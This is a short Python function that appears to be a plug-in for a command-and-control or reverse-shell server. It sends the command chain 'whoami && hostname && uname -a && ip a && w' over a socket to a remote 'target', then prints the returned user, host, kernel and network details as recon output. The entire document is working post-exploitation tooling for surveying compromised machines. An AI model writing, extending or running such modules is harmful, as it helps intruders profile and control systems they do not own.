def run(client_socket):
    try:
        print("[*] Running basic recon on target...")

        # Send command to client
        command = "whoami && hostname && uname -a && ip a && w"
        client_socket.send(command.encode())

        # Receive and print result
        output = client_socket.recv(4096).decode()
        print("\n[=== Recon Output ===]")
        print(output)
        print("[====================]\n")

    except Exception as e:
        print(f"[!] Failed to run recon_basic: {e}")
